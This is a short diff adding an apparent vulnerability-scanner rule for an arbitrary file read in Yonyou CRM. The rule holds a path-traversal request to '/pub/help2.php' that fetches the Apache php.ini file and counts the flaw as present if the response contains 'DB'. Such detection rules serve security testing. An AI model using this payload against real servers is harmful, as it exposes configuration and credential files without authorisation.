@@ -1,0 +1,8 @@
+name: yongyou-CRM-key-fileread
+rules:
+  - method: GET
+    path: "/pub/help2.php?key=/../../apache/php.ini"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'DB')
+detail:
+  author: 666
